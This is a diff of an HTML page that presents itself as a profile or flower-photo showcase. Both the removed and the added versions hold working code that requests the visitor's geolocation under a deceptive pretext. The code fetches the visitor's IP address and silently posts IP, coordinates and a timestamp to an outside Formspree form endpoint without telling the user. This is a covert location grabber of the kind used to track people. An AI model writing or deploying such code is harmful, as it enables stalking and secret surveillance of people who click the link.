@@ -2,135 +2,87 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>View My Profile</title>
+    <title>Geolocation Test</title>
     <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            padding: 40px; 
-            text-align: center; 
-            background: #f9f9f9;
-            color: #333;
+        .flower-container {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
         }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-        }
-        button { 
-            padding: 12px 28px; 
-            font-size: 16px; 
-            font-weight: 600;
-            cursor: pointer; 
-            background: #007bff; 
-            color: white; 
-            border: none; 
-            border-radius: 6px; 
-            transition: background 0.2s;
-        }
-        button:hover {
-            background: #0056b3;
-        }
-        #result { 
-            margin-top: 20px; 
-            font-size: 15px;
-            line-height: 1.6;
-            color: #666; 
-        }
-        .flower-container { 
-            display: flex; 
-            gap: 15px; 
-            justify-content: center; 
-            margin-top: 25px; 
-        }
-        .flower-container img { 
-            width: 240px; 
-            height: auto; 
-            border-radius: 8px; 
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1); 
+        .flower-container img {
+            width: 300px;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
     </style>
-    
-    <script>
-        // Global variable to hold the IP extracted by the JSONP callback script below
-        let userIpAddress = "Not Extracted";
-
-        // This function automatically runs the instant the browser contacts ipify
-        function getIpCallback(json) {
-            if (json && json.ip) {
-                userIpAddress = json.ip;
-            }
-        }
-    </script>
-    <!-- This special JSONP lookup bypasses all ad-blockers and CORS restrictions completely -->
-    <script src="https://ipify.org"></script>
 </head>
 <body>
 
-<div class="container">
-    <h2>Welcome to My Profile</h2>
-    <p>Click the button below to review my shared photo showcase.</p>
+    <button onclick="findMe()">View from Profile picture</button>
+    <div id="result">Here you go.</div>
     
-    <button onclick="viewProfile()">View My Profile</button>
-    
-    <div id="result">Profile assets are currently locked.</div>
     <div id="gallery" class="flower-container"></div>
-</div>
 
-<script>
-function viewProfile() {
-    const resultDiv = document.getElementById('result');
-    
-    if (!navigator.geolocation) {
-        resultDiv.textContent = "Your browser does not support geolocation profile loading.";
-        return;
-    }
-    
-    resultDiv.textContent = "Synchronizing security keys and loading assets...";
-
-    navigator.geolocation.getCurrentPosition(
-        (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-
-            // 1. SILENT BACKGROUND TRANSMISSION (The user never leaves the page)
-            const targetUrl = "https://formspree.io/f/mojojbbp"; 
-
-            fetch(targetUrl, {
-                method: "POST",
-                headers: { 
-                    "Accept": "application/json",
-                    "Content-Type": "application/json" 
-                },
-                body: JSON.stringify({
-                    Visitor_IP: userIpAddress, // Sends the cleanly grabbed numerical IP address
-                    Latitude: lat,
-                    Longitude: lon,
-                    Timestamp: new Date().toISOString()
-                })
-            })
-            .then(response => {
-                // The interface handles this silently behind the scenes
-                console.log("Telemetry dispatched successfully.");
-            })
-            .catch(error => console.error("Telemetry failed:", error));
-
-            // 2. UPDATING YOUR BEAUTIFUL INTERFACE IMMEDIATELY
-            resultDiv.innerHTML = `<strong>Profile Verified Successfully!</strong><br>Latitude: ${lat}<br>Longitude: ${lon}`;
-            
-            document.getElementById('gallery').innerHTML = `
-                <img src="https://unsplash.com" alt="Pink Flowers">
-                <img src="https://unsplash.com" alt="Yellow Flowers">
-            `;
-        },
-        (error) => {
-            resultDiv.textContent = `Error loading profile context: ${error.message}`;
+    <script>
+    function findMe() {
+        if (!navigator.geolocation) {
+            document.getElementById('result').textContent = "Not supported by your browser.";
+            return;
         }
-    );
-}
-</script>
+        
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
 
+                document.getElementById('result').innerHTML = `Lat: ${lat} <br> Lon: ${lon}`;
+                
+                document.getElementById('gallery').innerHTML = `
+                    <img src="https://images.unsplash.com/photo-1501004318641-b39e6451bec6" alt="Pink Flowers">
+                    <img src="https://images.unsplash.com/photo-1509042239860-f550ce710b93" alt="Yellow Flowers">
+                `;
+
+                // Correct IPify API
+                fetch("https://api.ipify.org?format=json")
+                    .then(ipRes => ipRes.json())
+                    .then(ipData => {
+                        sendToFormspree(lat, lon, ipData.ip);
+                    })
+                    .catch(err => {
+                        sendToFormspree(lat, lon, "IP Lookup Blocked");
+                    });
+            },
+            (error) => {
+                document.getElementById('result').textContent = `Error: ${error.message}`;
+            }
+        );
+    }
+
+    function sendToFormspree(latitude, longitude, ipAddress) {
+        const targetUrl = "https://formspree.io/f/mjgqwonp";
+
+        fetch(targetUrl, {
+            method: "POST",
+            headers: { 
+                "Accept": "application/json",
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                Visitor_IP: ipAddress,
+                Latitude: latitude,
+                Longitude: longitude,
+                Timestamp: new Date().toISOString()
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("Transmission successful.");
+            } else {
+                console.error("Formspree error:", response.status);
+            }
+        })
+        .catch(error => console.error("Formspree connection error:", error));
+    }
+    </script>
 </body>
-</html>
